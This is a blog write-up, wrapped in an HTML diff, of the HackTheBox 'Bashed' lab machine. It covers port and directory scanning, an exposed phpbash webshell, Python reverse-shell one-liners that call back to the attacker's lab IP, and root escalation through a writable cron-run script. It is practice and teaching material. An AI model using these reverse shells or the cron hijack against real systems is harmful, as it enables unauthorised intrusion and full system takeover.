@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - Bashed [no metasploit]</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - Bashed [no metasploit]</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="November 10, 2020">
+      Nov 10
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/linux">linux</a>
+    <a href="https://shiny-labs.re/tags/cron">cron</a>
+    <a href="https://shiny-labs.re/tags/webshell">webshell</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p><img src="img/image-20201110092252325.png" alt="image-20201110092252325"></p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">export ip=10.10.10.68
+</code></pre></div><p>Starting with a Nmap TCP scan to discover used ports and services behind, with our usual options:</p>
+<ul>
+<li><code>-sC</code> runs defaults Nmap scripts</li>
+<li><code>-sV</code> tries to identify the software versions</li>
+<li><code>-oA</code> will output the results in files prefixed by nmap_tcp and using the formats xml, nmap and gnmap</li>
+<li><code>-p-</code> will scan all ports and not the 1000 usual ones</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo nmap -O -sV -sC -oA nmap_tcp -p- <span class="nv">$ip</span>
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-31 17:13 CET
+Stats: 0:00:51 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Service Scan
+Service scan Timing: About 0.00% <span class="k">done</span>
+Nmap scan report <span class="k">for</span> 10.10.10.68
+Host is up <span class="o">(</span>0.041s latency<span class="o">)</span>.
+Not shown: <span class="m">65534</span> closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Arrexel<span class="err">&#39;</span>s Development Site
+No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>10/31%OT<span class="o">=</span>80%CT<span class="o">=</span>1%CU<span class="o">=</span>36183%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>I%G<span class="o">=</span>Y%TM<span class="o">=</span>5F9D8D
+OS:6F%P<span class="o">=</span>x86_64-unknown-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>102%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10A%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS
+OS:<span class="o">=</span>8<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M
+OS:54DST11NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>7120%W2<span class="o">=</span>7120%W3<span class="o">=</span>7120%W4<span class="o">=</span>7120%W5<span class="o">=</span>7120%W6<span class="o">=</span><span class="m">71</span>
+OS:20<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>7210%O<span class="o">=</span>M54DNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>
+OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q
+OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A
+OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
+OS:%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T
+OS:<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Network Distance: <span class="m">2</span> hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 64.30 seconds
+</code></pre></div><p>And let’s start a UDP scan (with the <code>-sU</code> flag) in the background:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -sU -oA nmap_udp_light <span class="nv">$ip</span>
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-01 22:25 CET
+Nmap scan report <span class="k">for</span> 10.10.10.68
+Host is up <span class="o">(</span>0.040s latency<span class="o">)</span>.
+All <span class="m">1000</span> scanned ports on 10.10.10.68 are closed
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1087.67 seconds
+</code></pre></div><h2 id="strategy">Strategy</h2>
+<p>Our target is fairly clear here, there&rsquo;s only one service to attack: the Apache server.  Let&rsquo;s try to see if we can find public exploits affecting version 2.4.18.</p>
+<h1 id="website---port-80">Website - port 80</h1>
+<h2 id="website">Website</h2>
+<p>Let&rsquo;s visit the website at http://10.10.10.68</p>
+<p><img src="img/image-20201031175159039.png" alt="image-20201031175159039"></p>
+<p>What&rsquo;s this phpbash thing? There&rsquo;s a github link to <a href="https://github.com/Arrexel/phpbash,">https://github.com/Arrexel/phpbash,</a> a PHP interactive shell. Just drop the file on the server and execute commands!</p>
+<p><img src="img/image-20201031175308205.png" alt="image-20201031175308205"></p>
+<p>Unfortunately, http://10.10.10.68/uploads/phpbash.php is not available:</p>
+<p><img src="img/image-20201031175700398.png" alt="image-20201031175700398"></p>
+<p>Dead-ends:</p>
+<ul>
+<li>http://10.10.10.68/config.php =&gt; exists but empty</li>
+<li>http://10.10.10.68/uploads =&gt; exists but empty</li>
+</ul>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Quick check on CVEs for <code>Apache 2.4.</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">searchsploit apache 2.4
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                        |  Path
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Code Execution                                                       | php/remote/29290.c
+Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execution + Scanner                                                     | php/remote/29316.py
+Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripting                                                     | unix/remote/30835.sh
+Apache 2.4.17 - Denial of Service                                                                                     | windows/dos/39037.php
+Apache 2.4.17 &lt; 2.4.38 - &#39;apache2ctl graceful&#39; &#39;logrotate&#39; Local Privilege Escalation                                 | linux/local/46676.php
+Apache 2.4.23 mod_http2 - Denial of Service                                                                           | linux/dos/40909.py
+Apache 2.4.7 + PHP 7.0.2 - &#39;openssl_seal()&#39; Uninitialized Memory Code Execution                                       | php/remote/40142.php
+Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                          | linux/dos/34133.txt
+Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory Leak                                                                      | linux/webapps/42745.py
+
+</code></pre></div><p>There&rsquo;s only a local privilege escalation compatible with our apache version, <code>linux/local/46676.php</code>. No good for us.</p>
+<h2 id="recon">Recon</h2>
+<p>Let&rsquo;s run <code>gobuster</code> and see if there&rsquo;s any interesting directory:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ gobuster -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/images (Status: 301)
+/js (Status: 301)
+/css (Status: 301)
+/uploads (Status: 301)
+/config.php (Status: 200)
+/dev (Status: 301)
+/php (Status: 301)
+/fonts (Status: 301)
+/server-status (Status: 403)
+</code></pre></div><h1 id="shell-as-www-data">Shell as www-data</h1>
+<p>The <code>dev</code> directory sounds interesting, let&rsquo;s check it out:</p>
+<p><img src="img/image-20201101225606033.png" alt="image-20201101225606033"></p>
+<p>We&rsquo;re allowed to list files in that directory and look, there&rsquo;s our <code>phpbash.php</code> here! Browse to http://10.10.10.6/dev/phpbash.php to have an interactive shell:</p>
+<p><img src="img/image-20201101225742903.png" alt="image-20201101225742903"></p>
+<h2 id="usertxt">user.txt</h2>
+<p>And huh, this is how we can get access to the first flag, in <code>/home/arrexel</code>:</p>
+<p><img src="img/image-20201101230757263.png" alt="image-20201101230757263"></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">www-data@bashed:/home/arrexel# sudo -l
+
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+</code></pre></div><p>Using sudo  we can run any commands as the user <code>scriptmanager</code>, let&rsquo;s try:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">www-data@bashed:/home/arrexel# sudo su scriptmanager
+
+sudo: no tty present and no askpass program specified
+</code></pre></div><p>I guess we are going to need a real shell though and not just a webshell :))</p>
+<p>Fortunately, the machine has Python installed, we can use that to get a reverse shell on the machine!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">www-data@bashed:/home/arrexel# python --version
+Python 2.7.12
+</code></pre></div><h2 id="upgrade-to-a-reverse-shell">Upgrade to a Reverse Shell</h2>
+<p>In the PHP webshell:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.25&#34;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre></div><p>On the host:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nc -lvp 4242
+Connection from 10.10.10.68:33404
+www-data@bashed:/var/www/html/dev$ whoami
+whoami
+www-data
+</code></pre></div><p>Note: switching to the <code>scriptmanager</code> user cannot be done with <code>sudo su scriptmanager</code> because it requires the password of the current user that we don&rsquo;t have. Bypass this limitation by using the <code>-u</code> option to run a command as a specified user:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash
+scriptmanager@bashed:/var/www/html/dev$ whoami
+whoami
+scriptmanager
+</code></pre></div><h1 id="privesc">Privesc</h1>
+<p>Alright! Let&rsquo;s explore what this <code>scriptmanager</code> user has access to (apparently, not much):</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">scriptmanager@bashed:~$ find / -user scriptmanager 2&gt;/dev/null
+find / -user scriptmanager 2&gt;/dev/null
+/scripts
+/scripts/test.py
+/home/scriptmanager
+/home/scriptmanager/.profile
+/home/scriptmanager/.bashrc
+/home/scriptmanager/.nano
+/home/scriptmanager/.bash_history
+/home/scriptmanager/.bash_logout
+</code></pre></div><p>Check the <code>/scripts</code> directory:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">scriptmanager@bashed:/var/www/html/dev$ ls -la /scripts
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+-rw-r--r--  1 root          root            12 Nov  3 13:07 test.txt
+
+scriptmanager@bashed:/scripts$ cat test.txt
+testing 123!
+
+scriptmanager@bashed:/scripts$ cat test.py
+f = open(&#34;test.txt&#34;, &#34;w&#34;)
+f.write(&#34;testing 123!&#34;)
+f.close
+</code></pre></div><p>There&rsquo;s two files:</p>
+<ul>
+<li><code>test.py</code> which we own and can modify. It&rsquo;s a simple script that writes &ldquo;testing 123!&rdquo; to <code>test.txt</code></li>
+<li><code>test.txt</code> which is created by <code>test.py</code> owned by root</li>
+</ul>
+<p>The funny thing is that test.txt is owned by root, that shouldn&rsquo;t happen if the script is executed by scriptmanager right? Which means that <code>test.py</code> is run as root. The other thing to notice is the last modified date of <code>test.txt</code>: it&rsquo;s updated every minute. So there&rsquo;s probably a crontab running somewhere, which executes <code>test.py</code> as root. If we modify <code>test.py</code> to spawn a shell, we should get a root shell!</p>
+<p>I checked the crontab from scriptmanager just in case, but it&rsquo;s empty:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">scriptmanager@bashed:/scripts$ crontab -l
+crontab -l
+no crontab for scriptmanager
+</code></pre></div><p>Modify <code>test.py</code> to run a reverse shell on port <code>2424</code> this time:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">scriptmanager@bashed:/scripts$ cat <span class="s">&lt;&lt; EOF &gt; test.py
+</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.25&#34;,2424));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)
+</span><span class="s">EOF</span>
+</code></pre></div><p>Run a listener on your host and wait for the cron tab to trigger. Receive a root shell /o/</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[ bamboozled-goose ~ ]# nc -lvp 2424
+Connection from 10.10.10.68:37298
+root@bashed:/scripts# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div><p><img src="img/image-20201103232406849.png" alt="image-20201103232406849"></p>
+<h1 id="takeaways">Takeaways</h1>
+<ul>
+<li>Why tf would you let &ldquo;development&rdquo; webshell files on your server</li>
+<li>Don&rsquo;t let scripts writable by someone else that root run as root</li>
+</ul>
+<p><img src="img/cat_hula_hoop.gif" alt="cat hula hoop"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#strategy">Strategy</a></li>
+      </ul>
+    </li>
+    <li><a href="#website---port-80">Website - port 80</a>
+      <ul>
+        <li><a href="#website">Website</a></li>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+        <li><a href="#recon">Recon</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-www-data">Shell as www-data</a>
+      <ul>
+        <li><a href="#usertxt">user.txt</a></li>
+        <li><a href="#upgrade-to-a-reverse-shell">Upgrade to a Reverse Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc">Privesc</a></li>
+    <li><a href="#takeaways">Takeaways</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
